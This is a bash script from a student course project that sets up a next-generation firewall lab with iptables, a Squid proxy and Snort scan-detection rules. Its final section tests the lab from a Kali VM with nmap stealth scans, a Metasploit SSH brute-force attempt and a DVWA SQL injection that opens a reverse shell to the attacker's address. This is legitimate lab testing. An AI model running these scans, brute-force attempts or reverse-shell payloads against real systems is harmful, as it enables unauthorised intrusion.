@@ -1,0 +1,298 @@
+#!/bin/bash
+# Next-Generation Firewall (NGFW) Framework Setup Script
+# Course Project: Secure Framework for Next-Generation Firewalls
+# Team Members:
+#   - Yousif Al-Saleem 220110470
+#   - Fahad Al-Medyan 220110472
+# Instructor: Dr. Asif Siddiqui
+# Term: 241
+
+########################################
+# Part 1: Update and Upgrade System
+########################################
+
+# Update package lists
+sudo apt-get update
+
+# Upgrade installed packages to the latest versions
+sudo apt-get upgrade -y
+
+########################################
+# Part 2: Install and Configure iptables
+########################################
+
+# Install iptables if not already installed
+sudo apt-get install -y iptables iptables-persistent
+
+# Set default policies: DROP incoming and forwarding traffic, ACCEPT outgoing traffic
+sudo iptables -P INPUT DROP
+sudo iptables -P FORWARD DROP
+sudo iptables -P OUTPUT ACCEPT
+
+# Allow incoming SSH (port 22) connections
+sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW,ESTABLISHED -j ACCEPT
+sudo iptables -A OUTPUT -p tcp --sport 22 -m conntrack --ctstate ESTABLISHED -j ACCEPT
+
+# Allow loopback interface traffic
+sudo iptables -A INPUT -i lo -j ACCEPT
+sudo iptables -A OUTPUT -o lo -j ACCEPT
+
+# Allow established and related incoming connections
+sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
+
+# Allow incoming traffic on port 8080 (Squid Proxy)
+sudo iptables -A INPUT -p tcp --dport 8080 -j ACCEPT
+
+# Enable packet forwarding
+sudo sysctl -w net.ipv4.ip_forward=1
+
+# Make packet forwarding persistent
+echo "net.ipv4.ip_forward=1" | sudo tee -a /etc/sysctl.conf
+
+# Save iptables rules to ensure they persist after reboot
+sudo netfilter-persistent save
+
+########################################
+# Part 3: Install and Configure Squid Proxy
+########################################
+
+# Install Squid proxy server
+sudo apt-get install -y squid
+
+# Backup the original Squid configuration file
+sudo cp /etc/squid/squid.conf /etc/squid/squid.conf.backup
+
+# Configure Squid as a transparent proxy
+sudo bash -c 'cat <<EOL >> /etc/squid/squid.conf
+http_port 8080 transparent
+acl localnet src 172.16.62.0/24
+http_access allow localnet
+http_access deny all
+EOL'
+
+# Restart Squid to apply the new configuration
+sudo systemctl restart squid
+
+# Enable Squid to start on boot
+sudo systemctl enable squid
+
+# Redirect HTTP traffic to Squid proxy using iptables
+sudo iptables -t nat -A PREROUTING -i ens160 -p tcp --dport 80 -j REDIRECT --to-port 8080
+
+# Save the new iptables rule
+sudo netfilter-persistent save
+
+########################################
+# Part 4: Install and Configure Snort
+########################################
+
+# Install required dependencies for Snort
+sudo apt-get install -y build-essential libpcap-dev libpcre3-dev libdumbnet-dev \
+zlib1g-dev liblzma-dev openssl libssl-dev libnetfilter-queue-dev
+
+# Navigate to /tmp directory for source installations
+cd /tmp
+
+# Download Snort source code
+wget https://www.snort.org/downloads/snort/snort-2.9.20.tar.gz
+
+# Extract the Snort tarball
+tar -xzvf snort-2.9.20.tar.gz
+
+# Navigate into the Snort source directory
+cd snort-2.9.20
+
+# Configure Snort with Sourcefire enabled
+./configure --enable-sourcefire
+
+# Compile Snort
+make
+
+# Install Snort
+sudo make install
+
+# Update shared library cache
+sudo ldconfig
+
+# Create necessary Snort directories
+sudo mkdir -p /etc/snort/rules
+sudo mkdir /var/log/snort
+sudo mkdir /usr/local/lib/snort_dynamicrules
+sudo mkdir -p /usr/local/lib/snort_dynamicpreprocessor/
+sudo mkdir -p /usr/local/lib/snort_dynamicengine/
+
+# Copy configuration files
+sudo cp etc/*.conf* /etc/snort/
+sudo cp etc/*.map /etc/snort/
+
+# Create Snort user and group for security
+sudo groupadd snort
+sudo useradd -g snort snort -s /sbin/nologin
+
+# Set ownership of Snort directories
+sudo chown -R snort:snort /etc/snort
+sudo chown -R snort:snort /var/log/snort
+sudo chown -R snort:snort /usr/local/lib/snort_dynamicrules
+sudo chown -R snort:snort /usr/local/lib/snort_dynamicpreprocessor/
+sudo chown -R snort:snort /usr/local/lib/snort_dynamicengine/
+
+# Navigate to dynamic preprocessors directory
+cd src/dynamic-preprocessors/
+
+# Configure, compile, and install dynamic preprocessors
+./configure
+make
+sudo make install
+
+# Navigate back to Snort source directory
+cd ..
+
+# Copy dynamic engine library
+sudo cp src/.libs/libsf_engine.so /usr/local/lib/snort_dynamicengine/
+
+# Navigate back to home directory
+cd ~
+
+# Edit Snort configuration file
+sudo nano /etc/snort/snort.conf
+
+# Add or modify the following lines in snort.conf:
+# Set network variables
+# ipvar HOME_NET 172.16.62.0/24
+# ipvar EXTERNAL_NET any
+
+# Set dynamic preprocessors and engine paths
+# dynamicpreprocessor directory /usr/local/lib/snort_dynamicpreprocessor/
+# dynamicengine /usr/local/lib/snort_dynamicengine/libsf_engine.so
+
+# Set rule paths and include local rules
+# var RULE_PATH /etc/snort/rules
+# include $RULE_PATH/local.rules
+
+# Set output to console
+# output alert_fast: stdout
+
+# Save and exit the editor
+
+# Create local rules file
+sudo touch /etc/snort/rules/local.rules
+sudo chown snort:snort /etc/snort/rules/local.rules
+
+# Add test rules to local.rules
+sudo bash -c 'cat <<EOL >> /etc/snort/rules/local.rules
+alert icmp any any -> \$HOME_NET any (msg:"ICMP Echo Request Detected"; itype:8; sid:1000001; rev:1;)
+alert tcp \$EXTERNAL_NET any -> \$HOME_NET any (msg:"TCP SYN Scan Detected"; flags:S; sid:1000002; rev:1;)
+alert tcp \$EXTERNAL_NET any -> \$HOME_NET any (msg:"TCP Null Scan Detected"; flags:0; sid:1000003; rev:1;)
+EOL'
+
+# Test Snort configuration for errors
+sudo snort -T -c /etc/snort/snort.conf -i ens160
+
+# If the configuration is valid, run Snort in IDS mode
+sudo snort -A console -q -c /etc/snort/snort.conf -i ens160
+
+# Alternatively, set up Snort as a systemd service
+# Create systemd service file for Snort
+sudo bash -c 'cat <<EOL > /etc/systemd/system/snort.service
+[Unit]
+Description=Snort Network Intrusion Detection System
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/usr/local/bin/snort -A console -q -c /etc/snort/snort.conf -i ens160
+ExecReload=/bin/kill -HUP \$MAINPID
+User=snort
+Group=snort
+
+[Install]
+WantedBy=multi-user.target
+EOL'
+
+# Reload systemd to recognize the new service
+sudo systemctl daemon-reload
+
+# Enable and start Snort service
+sudo systemctl enable snort
+sudo systemctl start snort
+
+# Verify Snort service status
+sudo systemctl status snort
+
+########################################
+# Part 5: Set Up Services on Ubuntu
+########################################
+
+# Install Netcat for listening on port 8080
+sudo apt-get install -y netcat
+
+# Start Netcat to listen on port 8080 (foreground)
+sudo nc -lvp 8080
+
+# Alternatively, run Netcat in the background
+sudo nohup nc -lvp 8080 &
+
+# Or set up a simple HTTP server using Python on port 8080
+sudo apt-get install -y python3
+cd /var/www/html
+sudo python3 -m http.server 8080 &
+
+########################################
+# Part 6: Testing with Kali Linux
+########################################
+
+# On Kali Linux VM
+
+########################################
+# 1. Verify Network Connectivity
+########################################
+
+# Ping Ubuntu VM to ensure connectivity
+ping -c 4 172.16.62.137
+
+########################################
+# 2. Perform Basic Nmap Scans
+########################################
+
+# Basic Nmap scan to identify open ports
+nmap 172.16.62.137
+
+# Stealth SYN scan
+nmap -sS 172.16.62.137
+
+# Null scan
+nmap -sN 172.16.62.137
+
+# FIN scan
+nmap -sF 172.16.62.137
+
+# Xmas scan
+nmap -sX 172.16.62.137
+
+########################################
+# 3. Simulate Exploit Attempts with Metasploit
+########################################
+
+# Launch Metasploit Framework
+sudo msfconsole
+
+# Within Metasploit Console:
+
+# Example A: Perform SSH Brute Force Attack
+use auxiliary/scanner/ssh/ssh_login
+set RHOSTS 172.16.62.137
+set RPORT 22
+set USERNAME root
+set PASSWORD password
+set THREADS 10
+run
+
+# Example B: Perform SQL Injection Attack on DVWA (Assuming DVWA is set up on port 8080)
+use exploit/unix/webapp/php_dvwa_sqli
+set RHOSTS 172.16.62.137
+set RPORT 8080
+set TARGETURI /dvwa/vulnerabilities/sqli/
+set PAYLOAD generic/shell_reverse_tcp
+set LHOST 172.16.62.138  # Replace with Kali VM's IP
+set LPORT 4444
+exploit
